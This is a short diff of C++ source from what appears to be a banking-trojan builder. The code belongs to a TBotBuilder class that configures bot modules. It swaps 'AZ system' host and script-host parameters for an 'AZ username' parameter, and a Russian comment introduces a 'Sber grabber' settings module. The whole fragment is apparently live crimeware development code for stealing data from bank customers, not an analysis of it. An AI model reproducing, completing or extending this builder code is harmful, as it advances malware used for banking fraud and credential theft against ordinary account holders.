@@ -686,8 +686,11 @@ void __fastcall TBotBuilder::InitializeModules()
 
 	// Ccskrb AZ
 	Module = AddModule(Module_AzConfig);
-	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "Хосты системы AZ");
-	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "Хосты Java скриптов системы AZ");
+//	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "Хосты системы AZ");
+//	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "Хосты Java скриптов системы AZ");
+	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_AZUSER, AZCONFIG_PARAM_NAME_AZUSER, AZCONFIG_PARAM_SIZE_AZUSER, "Имя пользователя AZ");
+
+
 
 	// Настройки грабера сбер
 	Module = AddModule(Module_SberHosts);
